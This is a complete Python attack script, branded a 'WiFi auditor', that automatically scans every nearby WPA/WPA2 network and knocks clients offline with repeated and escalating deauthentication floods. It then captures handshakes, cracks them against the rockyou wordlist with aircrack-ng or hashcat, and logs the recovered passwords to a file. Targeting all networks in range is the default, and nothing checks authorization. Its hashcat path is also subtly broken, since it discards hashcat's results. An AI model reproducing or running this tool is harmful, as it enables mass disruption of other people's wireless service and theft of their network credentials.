#!/usr/bin/env python3
import subprocess
import os
import time
import csv
import signal
import sys
import glob
import shutil
import argparse
import json
import tempfile
import re
INTERFACE_DEFAULT = "wlan1"
WORDLIST_DEFAULT = "/usr/share/wordlists/rockyou.txt"
SCAN_TIMEOUT = 15
CAPTURE_TIMEOUT_DEFAULT = 60
DEAUTH_PACKETS = 30
DEAUTH_INTERVAL = 8
MAX_DEAUTH_ROUNDS = 5
TEMP_DIR = "audit_temp"
HANDSHAKES_DIR = "handshakes"
CRACKED_PASSWORDS_FILE = "cracked_passwords.txt"
SESSION_FILE = "session.json"
LOG_FILE = "audit.log"
ACTIVE_PROCS = []
AIRCRACK_PROC = None
ORIGINAL_MODE_RESTORE = None
SERVICES_KILLED = False
SESSION_DATA = {"completed_bssids": [], "cracked": {}}
USED_AIRMON_NG = False
def log(message):
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
    formatted_msg = f"[{timestamp}] {message}"
    print(formatted_msg)
    try:
        with open(LOG_FILE, "a") as f:
            f.write(formatted_msg + "\n")
    except Exception:
        pass
def run_cmd(cmd, check=True, timeout=None):
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, check=check, timeout=timeout)
        return result.stdout
    except subprocess.CalledProcessError as e:
        log(f"Error executing: {cmd}\n{e.stderr}")
        return None
    except subprocess.TimeoutExpired:
        log(f"Timeout executing: {cmd}")
        return None
def check_dependencies():
    tools = ["aircrack-ng", "aireplay-ng", "iwconfig", "airmon-ng", "iw"]
    missing = [tool for tool in tools if shutil.which(tool) is None]
    if missing:
        log(f"CRITICAL: Missing required tools: {', '.join(missing)}")
        sys.exit(1)
    log("All dependencies verified.")
def kill_subprocesses():
    for proc in ACTIVE_PROCS:
        if proc.poll() is None:
            try:
                os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
                proc.wait(timeout=2)
            except ProcessLookupError:
                pass
            except Exception:
                try:
                    proc.terminate()
                except Exception:
                    pass
    ACTIVE_PROCS.clear()
def kill_aircrack():
    global AIRCRACK_PROC
    if AIRCRACK_PROC and AIRCRACK_PROC.poll() is None:
        log("Terminating aircrack-ng process...")
        try:
            os.killpg(os.getpgid(AIRCRACK_PROC.pid), signal.SIGTERM)
            AIRCRACK_PROC.wait(timeout=3)
        except Exception:
            try:
                AIRCRACK_PROC.terminate()
            except Exception:
                pass
        AIRCRACK_PROC = None
def load_session():
    global SESSION_DATA
    if os.path.exists(SESSION_FILE):
        try:
            with open(SESSION_FILE, 'r') as f:
                SESSION_DATA = json.load(f)
            log(f"Loaded session: {len(SESSION_DATA['completed_bssids'])} captured, {len(SESSION_DATA['cracked'])} cracked.")
        except Exception as e:
            log(f"Could not load session: {e}")
def save_session():
    try:
        with open(SESSION_FILE, 'w') as f:
            json.dump(SESSION_DATA, f, indent=2)
    except Exception as e:
        log(f"Failed to save session: {e}")
def cleanup(signum=None, frame=None):
    global SERVICES_KILLED, ORIGINAL_MODE_RESTORE, USED_AIRMON_NG
    if signum:
        log(f"\nCaught signal {signum}. Forcing emergency cleanup...")
    kill_aircrack()
    kill_subprocesses()
    if ORIGINAL_MODE_RESTORE:
        if USED_AIRMON_NG:
            log(f"Restoring interface using airmon-ng stop {ORIGINAL_MODE_RESTORE}...")
            run_cmd(f"airmon-ng stop {ORIGINAL_MODE_RESTORE}", check=False)
        else:
            log(f"Restoring interface {ORIGINAL_MODE_RESTORE} to managed mode...")
            run_cmd(f"ip link set {ORIGINAL_MODE_RESTORE} down", check=False)
            run_cmd(f"iw dev {ORIGINAL_MODE_RESTORE} set type managed", check=False)
            run_cmd(f"ip link set {ORIGINAL_MODE_RESTORE} up", check=False)
    if SERVICES_KILLED:
        log("Restarting network services...")
        run_cmd("systemctl restart NetworkManager wpa_supplicant", check=False)
        run_cmd("service network-manager restart", check=False)
        run_cmd("service wpa_supplicant restart", check=False)
        run_cmd("dhclient -r", check=False)
        run_cmd("dhclient", check=False)
        log("Network services restored.")
    save_session()
    if signum:
        sys.exit(1)
def get_monitor_interface(args):
    global ORIGINAL_MODE_RESTORE, SERVICES_KILLED, USED_AIRMON_NG
    iface = args.interface
    log("Killing interfering network services...")
    output = run_cmd("airmon-ng check kill", check=False)
    if output is not None:
        SERVICES_KILLED = True
        log("Network services temporarily disabled.")
    if not iface:
        output = run_cmd("iw dev", check=False)
        if output:
            interfaces = re.findall(r'Interface\s+(\S+)', output)
            if interfaces:
                for ifc in interfaces:
                    check = run_cmd(f"iwconfig {ifc} 2>/dev/null", check=False)
                    if check and ("Mode:Monitor" in check or "Mode: Monitor" in check):
                        log(f"Detected monitor mode interface: {ifc}")
                        ORIGINAL_MODE_RESTORE = ifc
                        return ifc
                if INTERFACE_DEFAULT in interfaces:
                    iface = INTERFACE_DEFAULT
                else:
                    iface = interfaces[0]
                log(f"Auto-selected interface: {iface}")
            else:
                log("CRITICAL: No wireless interfaces detected.")
                sys.exit(1)
        else:
            log("CRITICAL: 'iw dev' returned no output.")
            sys.exit(1)
    iw_info = run_cmd(f"iw dev {iface} info 2>/dev/null", check=False)
    if not iw_info or "Interface" not in iw_info:
        log(f"CRITICAL: Interface {iface} does not exist or is not a wireless device.")
        sys.exit(1)
    check = run_cmd(f"iwconfig {iface} 2>/dev/null", check=False)
    if check and ("Mode:Monitor" in check or "Mode: Monitor" in check):
        log(f"Interface {iface} is already in monitor mode.")
        ORIGINAL_MODE_RESTORE = iface
        return iface
    log(f"Attempting to set {iface} to monitor mode using 'iw'...")
    run_cmd(f"ip link set {iface} down", check=False)
    set_res = run_cmd(f"iw dev {iface} set type monitor", check=False)
    if set_res is not None:
        run_cmd(f"ip link set {iface} up", check=False)
        check_after = run_cmd(f"iwconfig {iface} 2>/dev/null", check=False)
        if check_after and ("Mode:Monitor" in check_after or "Mode: Monitor" in check_after):
            log(f"Successfully switched {iface} to monitor mode using 'iw'.")
            ORIGINAL_MODE_RESTORE = iface
            USED_AIRMON_NG = False
            return iface
    else:
        log(f"'iw' method failed. Falling back to airmon-ng...")
    log(f"Attempting to set monitor mode using 'airmon-ng start {iface}'...")
    proc = subprocess.Popen(
        f"airmon-ng start {iface}",
        shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
    )
    airmon_out, airmon_err = proc.communicate()
    if proc.returncode != 0:
        log(f"airmon-ng returned error: {airmon_err.strip()}")
        log(f"Output: {airmon_out.strip()}")
    else:
        match = re.search(r'\(monitor mode enabled on (\S+)\)', airmon_out)
        if match:
            new_iface = match.group(1)
            log(f"airmon-ng created monitor interface: {new_iface}")
            ORIGINAL_MODE_RESTORE = new_iface
            USED_AIRMON_NG = True
            return new_iface
        else:
            check_after = run_cmd(f"iwconfig {iface} 2>/dev/null", check=False)
            if check_after and ("Mode:Monitor" in check_after or "Mode: Monitor" in check_after):
                log(f"airmon-ng successfully set {iface} to monitor mode.")
                ORIGINAL_MODE_RESTORE = iface
                USED_AIRMON_NG = False
                return iface
    log(f"CRITICAL: Failed to set {iface} to monitor mode. Your card may not support it.")
    log("Try: sudo airmon-ng check kill && sudo airmon-ng start <interface> manually.")
    sys.exit(1)
def verify_injection(interface, force=False):
    if force:
        log("⚠️  --force specified: Skipping injection test. Proceeding at your own risk.")
        return True
    log(f"Setting interface {interface} to channel 6 for test...")
    run_cmd(f"iw dev {interface} set channel 6", check=False)
    time.sleep(1)
    def run_test(attempt):
        log(f"Running injection test on {interface} (15s) attempt {attempt}...")
        proc = subprocess.Popen(
            f"aireplay-ng --test {interface}",
            shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
        )
        time.sleep(15)
        proc.terminate()
        output, _ = proc.communicate()
        return output
    output = run_test(1)
    log("--- Injection Test Output (Attempt 1) ---")
    for line in output.splitlines():
        log(f"  {line}")
    log("--- End of Test Output ---")
    if "Injection is working!" in output:
        log("✅ Injection test PASSED on first attempt.")
        return True
    else:
        log("❌ Injection FAILED on first attempt. Retrying once after 3s...")
        time.sleep(3)
        output2 = run_test(2)
        log("--- Injection Test Output (Attempt 2) ---")
        for line in output2.splitlines():
            log(f"  {line}")
        log("--- End of Test Output ---")
        if "Injection is working!" in output2:
            log("✅ Injection test PASSED on second attempt.")
            return True
        else:
            log("❌ Injection FAILED on both attempts.")
            log("Suggestions:")
            log("  1. Check if your card supports injection: 'iw list | grep -A 10 Supported'")
            log("  2. Try reloading the driver: sudo rmmod <driver> && sudo modprobe <driver>")
            log("  3. Check kernel logs: dmesg | tail -20")
            log("  4. If you're certain clients are active, use --force to bypass this test.")
            return False
def find_column_index(headers, possible_names):
    for i, h in enumerate(headers):
        h_clean = h.strip().lower()
        for p in possible_names:
            if p in h_clean or h_clean in p:
                return i
    return -1
def parse_scan_csv(csv_file, args):
    targets = []
    if not os.path.exists(csv_file):
        return targets
    try:
        with open(csv_file, 'r', encoding='utf-8') as f:
            lines = f.readlines()
        ap_lines = []
        for line in lines:
            if "Station MAC" in line or "Station" in line:
                break
            if line.strip() == "":
                continue
            ap_lines.append(line)
        if not ap_lines:
            return targets
        reader = csv.reader(ap_lines)
        headers = next(reader, None)
        if not headers:
            return targets
        headers = [h.strip() for h in headers]
        bssid_idx = find_column_index(headers, ['bssid'])
        channel_idx = find_column_index(headers, ['channel', 'ch'])
        essid_idx = find_column_index(headers, ['essid'])
        privacy_idx = find_column_index(headers, ['privacy', 'enc', 'encryption'])
        power_idx = find_column_index(headers, ['power', 'pwr', 'signal'])
        if -1 in [bssid_idx, channel_idx, essid_idx, privacy_idx, power_idx]:
            return targets
        for row in reader:
            if len(row) <= max(bssid_idx, channel_idx, essid_idx, privacy_idx, power_idx):
                continue
            bssid = row[bssid_idx].strip()
            channel = row[channel_idx].strip()
            essid = row[essid_idx].strip()
            privacy = row[privacy_idx].strip()
            power_raw = row[power_idx].strip()
            try:
                power_val = int(power_raw)
            except ValueError:
                power_val = -100
            if power_val == -1:
                power_val = -90
            if bssid and channel and ("WPA" in privacy or "WPA2" in privacy):
                if args.target and args.target not in (essid, bssid):
                    continue
                if power_val < args.min_signal:
                    continue
                targets.append({
                    'bssid': bssid,
                    'channel': channel,
                    'essid': essid if essid else "<Hidden>",
                    'power': power_val
                })
    except Exception as e:
        log(f"Error parsing CSV: {e}")
    targets.sort(key=lambda x: x['power'], reverse=True)
    return targets
def get_active_clients(csv_file, target_bssid):
    clients = []
    if not os.path.exists(csv_file):
        return clients
    try:
        with open(csv_file, 'r', encoding='utf-8') as f:
            lines = f.readlines()
        in_client_section = False
        for line in lines:
            if "Station MAC" in line:
                in_client_section = True
                continue
            if in_client_section and line.strip():
                parts = line.split(',')
                if len(parts) >= 6:
                    client_mac = parts[0].strip()
                    bssid = parts[5].strip()
                    if bssid == target_bssid and client_mac != target_bssid:
                        clients.append(client_mac)
    except Exception:
        pass
    return clients
def has_handshake(cap_file):
    output = run_cmd(f"aircrack-ng {cap_file}", check=False)
    return output and ("1 handshake" in output or "Handshake" in output)
def get_essid_from_cap(cap_file):
    base = os.path.basename(cap_file)
    name = base[:-4]  
    parts = name.split('_')
    return parts[0] if parts else "Unknown"
def gather_all_handshakes():
    caps = []
    if not os.path.exists(HANDSHAKES_DIR):
        return caps
    for fname in os.listdir(HANDSHAKES_DIR):
        if fname.endswith('.cap'):
            full = os.path.join(HANDSHAKES_DIR, fname)
            if has_handshake(full):
                caps.append(full)
    return caps
def batch_crack_aircrack(cap_files, wordlist):
    global AIRCRACK_PROC
    if not cap_files:
        return {}
    log(f"Batch cracking {len(cap_files)} handshakes with aircrack-ng...")
    temp_out = tempfile.NamedTemporaryFile(suffix=".txt", delete=False).name
    cmd = ["aircrack-ng", "-w", wordlist, "-l", temp_out] + cap_files
    try:
        AIRCRACK_PROC = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1,
            start_new_session=True
        )
        output_lines = []
        for line in AIRCRACK_PROC.stdout:
            print(line, end='')
            output_lines.append(line)
        AIRCRACK_PROC.wait()
        output = ''.join(output_lines)
        pattern = re.compile(r'KEY FOUND!\s+\[\s*([^\]]+)\s*\]\s+([^\s]+)')
        found = {}
        for match in pattern.finditer(output):
            essid = match.group(1).strip()
            key = match.group(2).strip()
            found[essid] = key
        if os.path.exists(temp_out) and os.path.getsize(temp_out) > 0:
            with open(temp_out, 'r') as f:
                key_line = f.read().strip()
                if key_line and not found and len(cap_files) == 1:
                    essid = get_essid_from_cap(cap_files[0])
                    found[essid] = key_line
        os.unlink(temp_out)
        return found
    except Exception as e:
        log(f"Batch aircrack error: {e}")
        return {}
    finally:
        AIRCRACK_PROC = None
def batch_crack_hashcat(cap_files, wordlist):
    if not shutil.which("hcxpcapngtool") or not shutil.which("hashcat"):
        log("Hashcat tools not found. Falling back to aircrack.")
        return batch_crack_aircrack(cap_files, wordlist)
    log(f"Batch cracking {len(cap_files)} handshakes with Hashcat...")
    merged_hash = tempfile.NamedTemporaryFile(suffix=".hc22000", delete=False).name
    tmp_dir = tempfile.mkdtemp()
    success = True
    for cap in cap_files:
        hc_file = os.path.join(tmp_dir, os.path.basename(cap) + ".hc22000")
        cmd = f"hcxpcapngtool -o {hc_file} {cap}"
        if run_cmd(cmd, check=False) is None:
            log(f"Failed to convert {os.path.basename(cap)}. Skipping.")
            success = False
            continue
        with open(hc_file, 'r') as inf, open(merged_hash, 'a') as outf:
            outf.write(inf.read())
        os.unlink(hc_file)
    os.rmdir(tmp_dir)
    if not success or os.path.getsize(merged_hash) == 0:
        log("No valid hash files generated. Falling back to aircrack.")
        os.unlink(merged_hash)
        return batch_crack_aircrack(cap_files, wordlist)
    output_file = tempfile.NamedTemporaryFile(suffix=".txt", delete=False).name
    crack_cmd = f"hashcat -m 22000 {merged_hash} {wordlist} -a 0 -w 4 --force -O -o {output_file}"
    subprocess.call(crack_cmd, shell=True)
    found = {}
    if os.path.exists(output_file) and os.path.getsize(output_file) > 0:
        found = batch_crack_aircrack(cap_files, wordlist)
    os.unlink(merged_hash)
    if os.path.exists(output_file):
        os.unlink(output_file)
    return found
def run_auditor(args):
    global SESSION_DATA
    if os.geteuid() != 0:
        print("This script must be run with sudo.")
        sys.exit(1)
    signal.signal(signal.SIGINT, cleanup)
    signal.signal(signal.SIGTERM, cleanup)
    log("=== StormCracker Autonomous WiFi Auditor ===")
    try:
        check_dependencies()
        load_session()
        if not os.path.exists(args.wordlist):
            log(f"CRITICAL: Wordlist not found at {args.wordlist}")
            sys.exit(1)
        os.makedirs(TEMP_DIR, exist_ok=True)
        os.makedirs(HANDSHAKES_DIR, exist_ok=True)
        interface = get_monitor_interface(args)
        time.sleep(2)
        if not verify_injection(interface, args.force):
            log("Cannot continue without injection capability.")
            return
        log(f"Phase 1: Scanning ({SCAN_TIMEOUT}s)...")
        scan_id = int(time.time())
        scan_prefix = os.path.join(TEMP_DIR, f"scan_{scan_id}")
        scan_proc = subprocess.Popen(
            f"airodump-ng -w {scan_prefix} --output-format csv {interface}",
            shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE,
            text=True, start_new_session=True
        )
        ACTIVE_PROCS.append(scan_proc)
        time.sleep(SCAN_TIMEOUT)
        os.killpg(os.getpgid(scan_proc.pid), signal.SIGINT)
        scan_proc.wait(timeout=5)
        ACTIVE_PROCS.remove(scan_proc)
        time.sleep(1.5)
        csv_path = f"{scan_prefix}-01.csv"
        if not os.path.exists(csv_path) or os.path.getsize(csv_path) == 0:
            log("CRITICAL: Scan CSV is empty.")
            return
        targets = parse_scan_csv(csv_path, args)
        if not targets:
            log("No WPA/WPA2 targets found.")
            return
        log(f"Phase 2: Capturing handshakes for {len(targets)} targets...")
        newly_captured = []
        for target in targets:
            bssid = target['bssid']
            essid = target['essid']
            if bssid in SESSION_DATA['completed_bssids']:
                log(f"Skipping {essid} — already completed.")
                continue
            clean_essid = "".join([c if c.isalnum() else "_" for c in essid]) or "unknown"
            expected_save_path = os.path.join(HANDSHAKES_DIR, f"{clean_essid}_{bssid.replace(':', '')}.cap")
            if os.path.exists(expected_save_path) and has_handshake(expected_save_path):
                log(f"Skipping {essid} — handshake already archived.")
                SESSION_DATA['completed_bssids'].append(bssid)
                newly_captured.append(expected_save_path)
                save_session()
                continue
            log(f"Locking: {essid} ({bssid}) | PWR: {target['power']} | CH: {target['channel']}")
            current_channel = target['channel']
            cap_prefix = os.path.join(TEMP_DIR, f"cap_{bssid.replace(':', '')}")
            dump_cmd = f"airodump-ng -c {current_channel} --bssid {bssid} -w {cap_prefix} --output-format pcap,csv {interface}"
            dump_proc = subprocess.Popen(
                dump_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                start_new_session=True
            )
            ACTIVE_PROCS.append(dump_proc)
            start_time = time.time()
            handshake_found = False
            last_deauth = 0
            deauth_rounds = 0
            last_channel_check = 0
            while time.time() - start_time < args.timeout:
                if time.time() - last_channel_check > 10:
                    csv_files = glob.glob(f"{cap_prefix}-*.csv")
                    if csv_files:
                        temp_targets = parse_scan_csv(sorted(csv_files)[-1], args)
                        for t in temp_targets:
                            if t['bssid'] == bssid and t['channel'] != current_channel:
                                log(f"AP channel changed to {t['channel']}. Restarting airodump...")
                                kill_subprocesses()
                                current_channel = t['channel']
                                dump_cmd = f"airodump-ng -c {current_channel} --bssid {bssid} -w {cap_prefix} --output-format pcap,csv {interface}"
                                dump_proc = subprocess.Popen(
                                    dump_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                                    start_new_session=True
                                )
                                ACTIVE_PROCS.append(dump_proc)
                                break
                    last_channel_check = time.time()
                cap_files = glob.glob(f"{cap_prefix}-*.cap")
                if cap_files:
                    current_cap = sorted(cap_files)[-1]
                    if has_handshake(current_cap):
                        log(f"✅ Handshake captured for {essid}!")
                        shutil.copy(current_cap, expected_save_path)
                        newly_captured.append(expected_save_path)
                        handshake_found = True
                        SESSION_DATA['completed_bssids'].append(bssid)
                        save_session()
                        kill_subprocesses()
                        break
                if time.time() - last_deauth > DEAUTH_INTERVAL and deauth_rounds < MAX_DEAUTH_ROUNDS:
                    csv_files = glob.glob(f"{cap_prefix}-*.csv")
                    clients = []
                    if csv_files:
                        clients = get_active_clients(sorted(csv_files)[-1], bssid)
                    if clients:
                        for client in set(clients[:3]):
                            log(f"Deauthing client: {client}")
                            try:
                                subprocess.run(
                                    f"aireplay-ng -0 {DEAUTH_PACKETS} -a {bssid} -c {client} {interface} < /dev/null > /dev/null 2>&1",
                                    shell=True, timeout=10, check=False
                                )
                            except subprocess.TimeoutExpired:
                                log(f"Deauth timed out for client {client}, skipping.")
                    else:
                        log(f"No clients. Broadcast deauth to {essid}...")
                        try:
                            subprocess.run(
                                f"aireplay-ng -0 {DEAUTH_PACKETS} -a {bssid} {interface} < /dev/null > /dev/null 2>&1",
                                shell=True, timeout=10, check=False
                            )
                        except subprocess.TimeoutExpired:
                            log("Broadcast deauth timed out.")
                        if deauth_rounds >= 3:
                            log("Escalating: flooding with continuous deauth for 5s...")
                            flood_proc = subprocess.Popen(
                                f"aireplay-ng -0 0 -a {bssid} {interface} < /dev/null > /dev/null 2>&1",
                                shell=True, start_new_session=True
                            )
                            ACTIVE_PROCS.append(flood_proc)
                            time.sleep(5)
                            if flood_proc.poll() is None:
                                try:
                                    os.killpg(os.getpgid(flood_proc.pid), signal.SIGTERM)
                                except:
                                    pass
                            ACTIVE_PROCS.remove(flood_proc)
                    last_deauth = time.time()
                    deauth_rounds += 1
                if deauth_rounds >= MAX_DEAUTH_ROUNDS:
                    log(f"Max deauth rounds reached for {essid}. Moving on.")
                    break
                time.sleep(2)
            if not handshake_found:
                log(f"❌ Failed to capture handshake for {essid}.")
                kill_subprocesses()
        if args.skip_crack:
            log("Skipping cracking phase.")
            return
        all_handshakes = gather_all_handshakes()
        if not all_handshakes:
            log("No handshakes found to crack.")
            return
        to_crack = []
        for cap in all_handshakes:
            essid = get_essid_from_cap(cap)
            if essid in SESSION_DATA.get('cracked', {}):
                log(f"Skipping {essid} — already cracked.")
                continue
            to_crack.append(cap)
        if not to_crack:
            log("All handshakes already cracked.")
            return
        log(f"Phase 3: Batch cracking {len(to_crack)} handshakes...")
        print("\n" + "="*50)
        print("BATCH CRACKING ENGINE")
        print("="*50 + "\n")
        if args.hashcat:
            found_keys = batch_crack_hashcat(to_crack, args.wordlist)
        else:
            found_keys = batch_crack_aircrack(to_crack, args.wordlist)
        cracked_count = 0
        for essid, password in found_keys.items():
            if essid in SESSION_DATA.get('cracked', {}):
                continue
            log(f"🎉 VICTORY! [{essid}] Password: {password}")
            with open(CRACKED_PASSWORDS_FILE, "a") as cpf:
                cpf.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} | {essid} | {password}\n")
            SESSION_DATA['cracked'][essid] = password
            cracked_count += 1
            save_session()
        log(f"Batch cracking complete. New passwords recovered: {cracked_count}.")
        if os.path.exists(CRACKED_PASSWORDS_FILE):
            log(f"All passwords saved to: {CRACKED_PASSWORDS_FILE}")
    finally:
        cleanup()
        log("=== Session Concluded ===")
def parse_args():
    parser = argparse.ArgumentParser(description="StormCracker WiFi Auditor - Batch Edition")
    parser.add_argument("-i", "--interface", help="Wireless interface")
    parser.add_argument("-w", "--wordlist", default=WORDLIST_DEFAULT)
    parser.add_argument("-t", "--target", help="Target ESSID or BSSID")
    parser.add_argument("-s", "--min-signal", type=int, default=-100)
    parser.add_argument("--timeout", type=int, default=CAPTURE_TIMEOUT_DEFAULT)
    parser.add_argument("--skip-crack", action="store_true")
    parser.add_argument("--hashcat", action="store_true", help="Use Hashcat (experimental, may fallback)")
    parser.add_argument("--force", action="store_true", help="Bypass injection test")
    return parser.parse_args()
if __name__ == "__main__":
    args = parse_args()
    if os.environ.get("WIFI_AUDITOR_INHIBITED") != "1":
        print("[SYSTEM] Engaging Wake Lock...")
        cmd = [
            "systemd-inhibit",
            "--what=sleep:idle",
            "--who=WiFi Auditor",
            "--why=Running audit",
            sys.executable
        ] + sys.argv
        env = os.environ.copy()
        env["WIFI_AUDITOR_INHIBITED"] = "1"
        try:
            subprocess.run(cmd, env=env)
        except FileNotFoundError:
            print("[SYSTEM] Wake lock unavailable. Running directly.")
            run_auditor(args)
        except KeyboardInterrupt:
            sys.exit(130)
    else:
        run_auditor(args)
